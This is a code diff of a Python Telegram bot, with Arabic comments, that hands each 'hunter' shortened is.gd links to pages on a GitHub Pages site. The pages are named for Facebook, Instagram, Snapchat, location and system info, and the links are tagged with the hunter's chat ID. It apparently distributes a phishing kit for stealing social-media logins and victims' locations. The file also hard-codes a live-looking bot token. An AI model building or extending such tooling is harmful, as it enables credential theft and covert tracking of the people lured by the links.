@@ -1,11 +1,11 @@
 import telebot
 import requests
 
-# التوكن الخاص بك
+# التوكن تبعك
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
 
-# دالة اختصار الروابط (باستخدام is.gd)
+# دالة اختصار الروابط
 def short_link(url):
     try:
         res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
@@ -17,14 +17,13 @@ def short_link(url):
 def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
-    
-    # تجهيز اسم الصياد لاستخدامه في الرابط (تبديل الفراغات بشحطة)
+    # تجهيز اسم الصياد للرابط
     hunter_name = first_name.replace(" ", "_")
     
-    # رابط استضافتك على GitHub Pages (تأكد أن هذا الرابط صحيح)
+    # رابط استضافتك
     base = "https://m-y-9-tech.github.io/fb/"
     
-    # توليد الروابط وإرسال الـ ID واسم الصياد (hunter) لكل رابط
+    # توليد الروابط
     fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter_name}")
     ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter_name}")
     snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter_name}")
@@ -34,7 +33,7 @@ def send_welcome(message):
     loc = short_link(f"{base}loc.html?id={uid}&hunter={hunter_name}")
     sys = short_link(f"{base}sys.html?id={uid}&hunter={hunter_name}")
 
-    # الرسالة المزخرفة برابط حسابك المظبوط
+    # الرسالة الفخمة اللي اتفقنا عليها
     msg = f"""
 🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}
 
@@ -64,5 +63,5 @@ https://www.instagram.com/m_y_.9/
     """
     bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)
 
-print("النظام انطلق بنجاح يا أبو سند.. 🔥")
+print("النظام انطلق بنجاح.. 🔥")
 bot.infinity_polling()
